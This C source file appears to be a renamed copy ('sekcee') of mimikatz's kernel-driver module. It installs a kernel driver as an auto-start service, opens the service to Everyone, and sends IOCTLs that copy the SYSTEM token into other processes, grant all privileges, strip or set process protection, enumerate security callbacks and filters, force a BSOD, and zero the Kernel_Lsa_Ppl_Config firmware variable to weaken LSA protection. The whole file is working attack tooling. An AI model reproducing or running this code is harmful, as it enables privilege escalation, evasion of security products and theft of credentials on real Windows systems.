/*
	sekcee_extractor
	
	
*/
#include "kuhl_m_kernel.h"

const KUHL_K_C kuhl_k_c_kernel[] = {
	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start sekcee driver (mimidrv)"},
	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove sekcee driver (mimidrv)"},
	{NULL,								IOCTL_MIMIDRV_PING,					L"ping",			L"Ping the driver"},
	{NULL,								IOCTL_MIMIDRV_BSOD,					L"bsod",			L"BSOD !"},
	{NULL,								IOCTL_MIMIDRV_PROCESS_LIST,			L"process",			L"List process"},
	{kuhl_m_kernel_processProtect,		0,									L"processProtect",	L"Protect process"},
	{kuhl_m_kernel_processToken,		0,									L"processToken",	L"Duplicate process token"},
	{kuhl_m_kernel_processPrivilege,	0,									L"processPrivilege",L"Set all privilege on process"},
	{NULL,								IOCTL_MIMIDRV_MODULE_LIST,			L"modules",			L"List modules"},
	{NULL,								IOCTL_MIMIDRV_SSDT_LIST,			L"ssdt",			L"List SSDT"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_PROCESS_LIST,	L"notifProcess",	L"List process notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_THREAD_LIST,	L"notifThread",		L"List thread notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_IMAGE_LIST,	L"notifImage",		L"List image notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_REG_LIST,		L"notifReg",		L"List registry notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_OBJECT_LIST,	L"notifObject",		L"List object notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_FILTER_LIST,			L"filters",			L"List FS filters"},
	{NULL,								IOCTL_MIMIDRV_MINIFILTER_LIST,		L"minifilters",		L"List minifilters"},
	{kuhl_m_kernel_sysenv_set,			0,		L"sysenvset",		L"System Environment Variable Set"},
	{kuhl_m_kernel_sysenv_del,			0,		L"sysenvdel",		L"System Environment Variable Delete"},
};

NTSTATUS kuhl_m_kernel_do(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc);
	unsigned short indexCommand;
	BOOL commandFound = FALSE;

	if(argv && (argc > 0))
	{
		for(indexCommand = 0; !commandFound && (indexCommand < ARRAYSIZE(kuhl_k_c_kernel)); indexCommand++)
		{
			if(commandFound = _wcsicmp(argv[0], kuhl_k_c_kernel[indexCommand].command) == 0)
			{
				if(kuhl_k_c_kernel[indexCommand].pCommand)
					status = kuhl_k_c_kernel[indexCommand].pCommand(argc - 1, argv + 1);
				else
					kull_m_kernel_mimidrv_simple_output(kuhl_k_c_kernel[indexCommand].ioctlCode, NULL, 0);
			}
		}
		if(!commandFound)
			kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_RAW, input, (DWORD) (wcslen(input) + 1) * sizeof(wchar_t));
	}
	return status;
}

NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
{
	wchar_t *absFile, file[] = SEKCEE_DRIVER L".sys";
	SC_HANDLE hSC = NULL, hS = NULL;


	if(hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
	{
		if(hS = OpenService(hSC, SEKCEE_DRIVER, SERVICE_START))
		{
			sekcee_stdout(L"[+] sekcee driver already registered\n");
		}
		else
		{
			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
			{
				sekcee_stdout(L"[*] sekcee driver not present\n");
				if(kull_m_file_getAbsolutePathOf(file, &absFile))
				{
					if(kull_m_file_isFileExist(absFile))
					{
						sekcee_stdout(L"[+] sekcee driver path is\n");
						sekcee_stdout(L"%s\n", absFile);
						if(hS = CreateService(hSC, SEKCEE_DRIVER, L"sekcee driver (" SEKCEE_DRIVER L")", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, absFile, NULL, NULL, NULL, NULL, NULL))
						{
							sekcee_stdout(L"[+] sekcee driver successfully registered\n");

							if(kuhl_m_kernel_addWorldToSEKCEE(hS))
								sekcee_stdout(L"[+] sekcee driver ACL to everyone\n");
							else PRINT_ERROR_AUTO(L"kuhl_m_kernel_addWorldToSEKCEE");
						}
						else PRINT_ERROR_AUTO(L"CreateService");
					}
					else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");

					LocalFree(absFile);
				}
				else PRINT_ERROR_AUTO(L"kull_m_file_getAbsolutePathOf");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if(hS)
		{
			if(StartService(hS, 0, NULL))
				sekcee_stdout(L"[+] sekcee driver started\n");
			else if(GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
				sekcee_stdout(L"[*] sekcee driver already started\n");
			else
				PRINT_ERROR_AUTO(L"StartService");
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else PRINT_ERROR_AUTO(L"OpenSCManager(create)");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_kernel_addWorldToSEKCEE(SC_HANDLE monHandle)
{
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if(!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
	{
		if(oldSd = (PSECURITY_DESCRIPTOR) LocalAlloc(LPTR, dwSizeNeeded))
		{
			if(QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded))
			{
				if(AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID *)&ForEveryOne.Trustee.ptstrName))
				{
					if(BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS)
					{
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

NTSTATUS kuhl_m_kernel_remove_mimidrv(int argc, wchar_t * argv[])
{
	BOOL toRemove = TRUE;
	if(kull_m_service_stop(SEKCEE_DRIVER))
		sekcee_stdout(L"[+] sekcee driver stopped\n");
	else if(GetLastError() == ERROR_SERVICE_NOT_ACTIVE)
		sekcee_stdout(L"[*] sekcee driver not running\n");
	else
	{
		toRemove = FALSE;
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
	}

	if(toRemove)
	{
		if(kull_m_service_remove(SEKCEE_DRIVER))
			sekcee_stdout(L"[+] sekcee driver removed\n");
		else
			PRINT_ERROR_AUTO(L"kull_m_service_remove");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_PROTECT_INFORMATION protectInfos = {0, {0, 0, {0, 0, 0}}};
	PCWCHAR szProcessName, szPid;
	BOOL isUnprotect;

	if(SEKCEE_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
	{
		isUnprotect = kull_m_string_args_byName(argc, argv, L"remove", NULL, NULL);
		if(kull_m_string_args_byName(argc, argv, L"process", &szProcessName, NULL))
		{
			sekcee_stdout(L"Process : %s\n", szProcessName);
			if(!kull_m_process_getProcessIdForName(szProcessName, &protectInfos.processId))
				PRINT_ERROR_AUTO(L"kull_m_process_getProcessIdForName");
		}
		else if(kull_m_string_args_byName(argc, argv, L"pid", &szPid, NULL))
		{
			protectInfos.processId = wcstoul(szPid, NULL, 0);
		}
		else PRINT_ERROR(L"Argument /process:program.exe or /pid:processid needed\n");

		if(protectInfos.processId)
		{
			if(!isUnprotect)
			{
				if(SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
				{
					protectInfos.SignatureProtection.SignatureLevel = 1;
				}
				else if(SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
				{
					protectInfos.SignatureProtection.SignatureLevel = 0x0f;
					protectInfos.SignatureProtection.SectionSignatureLevel = 0x0f;
				}
				else
				{
					protectInfos.SignatureProtection.SignatureLevel = 0x3f;
					protectInfos.SignatureProtection.SectionSignatureLevel = 0x3f;

					protectInfos.SignatureProtection.Protection.Type = 2;
					protectInfos.SignatureProtection.Protection.Audit = 0;
					protectInfos.SignatureProtection.Protection.Signer = 6;
				}
			}
			sekcee_stdout(L"PID %u -> %02x/%02x [%1x-%1x-%1x]\n", protectInfos.processId, protectInfos.SignatureProtection.SignatureLevel, protectInfos.SignatureProtection.SectionSignatureLevel, protectInfos.SignatureProtection.Protection.Type, protectInfos.SignatureProtection.Protection.Audit, protectInfos.SignatureProtection.Protection.Signer);
			kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_PROTECT, &protectInfos, sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION));
		}
		else PRINT_ERROR(L"No PID\n");
	}
	else PRINT_ERROR(L"Protected process not available before Windows Vista\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_TOKEN_FROM_TO tokenInfo = {0, 0};
	PCWCHAR szFrom, szTo;

	if(kull_m_string_args_byName(argc, argv, L"from", &szFrom, NULL))
		tokenInfo.fromProcessId = wcstoul(szFrom, NULL, 0);

	if(kull_m_string_args_byName(argc, argv, L"to", &szTo, NULL))
		tokenInfo.toProcessId = wcstoul(szTo, NULL, 0);

	sekcee_stdout(L"Token from process %u to process %u\n", tokenInfo.fromProcessId, tokenInfo.toProcessId);
	if(!tokenInfo.fromProcessId)
		sekcee_stdout(L" * from 0 will take SYSTEM token\n");
	if(!tokenInfo.toProcessId)
		sekcee_stdout(L" * to 0 will take all \'cmd\' and \'sekcee\' process\n");

	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_processPrivilege(int argc, wchar_t * argv[])
{
	PCWCHAR szPid;
	ULONG pid = 0;

	if(kull_m_string_args_byName(argc, argv, L"pid", &szPid, NULL))
		pid = wcstoul(szPid, NULL, 0);
	
	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_FULLPRIV, pid ? &pid : NULL, pid ? sizeof(ULONG) : 0);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_sysenv_set(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	LPCWSTR szName, szGuid, szAttributes, szData;
	UNICODE_STRING uName, uGuid;
	GUID guid;
	LPBYTE hex = NULL;
	DWORD size, attributes, nameLen, structSize;
	PMIMIDRV_VARIABLE_NAME_AND_VALUE vnv;

	kull_m_string_args_byName(argc, argv, L"name", &szName, L"Kernel_Lsa_Ppl_Config");
	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, L"{77fa9abd-0359-4d32-bd60-28f4e78f784b}");
	kull_m_string_args_byName(argc, argv, L"attributes", &szAttributes, L"1");
	kull_m_string_args_byName(argc, argv, L"data", &szData, L"00000000");

	RtlInitUnicodeString(&uName, szName);
	RtlInitUnicodeString(&uGuid, szGuid);
	attributes = wcstoul(szAttributes, NULL, 0);

	status = RtlGUIDFromString(&uGuid, &guid);
	if(NT_SUCCESS(status))
	{
		sekcee_stdout(L"Name       : %wZ\nVendor GUID: ", &uName);
		kuhl_m_sysenv_display_vendorGuid(&guid);
		sekcee_stdout(L"\nAttributes : %08x (", attributes);
		kuhl_m_sysenv_display_attributes(attributes);
		sekcee_stdout(L")\n");
		if(kull_m_string_stringToHexBuffer(szData, &hex, &size))
		{
			sekcee_stdout(L"Length     : %u\nData       : ", size);
			kull_m_string_wprintf_hex(hex, size, 1);
			sekcee_stdout(L"\n\n");
			nameLen = ((DWORD) wcslen(szName) + 1) * sizeof(wchar_t);
			structSize = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen  + size;
			if(vnv = (PMIMIDRV_VARIABLE_NAME_AND_VALUE) LocalAlloc(LPTR, structSize))
			{
				vnv->Attributes = attributes;
				RtlCopyMemory(&vnv->VendorGuid, &guid, sizeof(GUID));
				vnv->ValueLength = size;
				vnv->ValueOffset = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen;
				RtlCopyMemory(vnv->Name, szName, nameLen);
				RtlCopyMemory((PBYTE) vnv + vnv->ValueOffset, hex, size);
				if(kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_SYSENVSET, vnv, structSize))
					sekcee_stdout(L"> OK!\n");
				LocalFree(vnv);
			}
			LocalFree(hex);
		}
	}
	else PRINT_ERROR(L"RtlGUIDFromString: 0x%08x\n", status);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kernel_sysenv_del(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	LPCWSTR szName, szGuid, szAttributes;
	UNICODE_STRING uName, uGuid;
	GUID guid;
	DWORD attributes, nameLen, structSize;
	PMIMIDRV_VARIABLE_NAME_AND_VALUE vnv;

	kull_m_string_args_byName(argc, argv, L"name", &szName, L"Kernel_Lsa_Ppl_Config");
	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, L"{77fa9abd-0359-4d32-bd60-28f4e78f784b}");
	kull_m_string_args_byName(argc, argv, L"attributes", &szAttributes, L"1");

	RtlInitUnicodeString(&uName, szName);
	RtlInitUnicodeString(&uGuid, szGuid);
	attributes = wcstoul(szAttributes, NULL, 0);

	status = RtlGUIDFromString(&uGuid, &guid);
	if(NT_SUCCESS(status))
	{
		sekcee_stdout(L"Name       : %wZ\nVendor GUID: ", &uName);
		kuhl_m_sysenv_display_vendorGuid(&guid);
		sekcee_stdout(L"\nAttributes : %08x (", attributes);
		kuhl_m_sysenv_display_attributes(attributes);
		sekcee_stdout(L")\n\n");

		nameLen = ((DWORD) wcslen(szName) + 1) * sizeof(wchar_t);
		structSize = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen;
		if(vnv = (PMIMIDRV_VARIABLE_NAME_AND_VALUE) LocalAlloc(LPTR, structSize))
		{
			vnv->Attributes = attributes;
			RtlCopyMemory(&vnv->VendorGuid, &guid, sizeof(GUID));
			vnv->ValueLength = 0;
			vnv->ValueOffset = 0;
			RtlCopyMemory(vnv->Name, szName, nameLen);
			if(kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_SYSENVSET, vnv, structSize))
				sekcee_stdout(L"> OK!\n");
			LocalFree(vnv);
		}
	}
	else PRINT_ERROR(L"RtlGUIDFromString: 0x%08x\n", status);
	return STATUS_SUCCESS;
}